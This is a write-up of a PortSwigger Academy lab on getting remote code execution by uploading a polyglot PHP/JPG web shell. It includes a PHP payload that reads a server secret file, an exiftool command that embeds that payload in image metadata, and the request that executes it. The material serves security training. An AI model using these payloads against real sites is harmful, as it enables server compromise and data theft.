# Lab: Remote code execution via polyglot web shell upload

**Official lab:** [https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

## Lab idea

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. This challenge highlights that an image-content check may still accept a file that also contains server-side code, illustrating the limits of treating a valid image signature or structure as sufficient proof of safety.

## Vulnerability in brief
There is no widely used acronym for this topic.

## Solution idea
1. On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret.
2. Log in and attempt to upload the script as your avatar.
3. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata.
4. In the browser, upload the polyglot image as your avatar, then go back to your account page.
5. In Burp's proxy history, find the GET /files/avatars/polyglot.php request.
6. Submit the secret to solve the lab.

## Payloads / key values
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`
- `Comment`
- `.php`
- `GET /files/avatars/polyglot.php`
- `START`
- `END`
- `START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END`

## Official source
- [PortSwigger Academy: Lab: Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
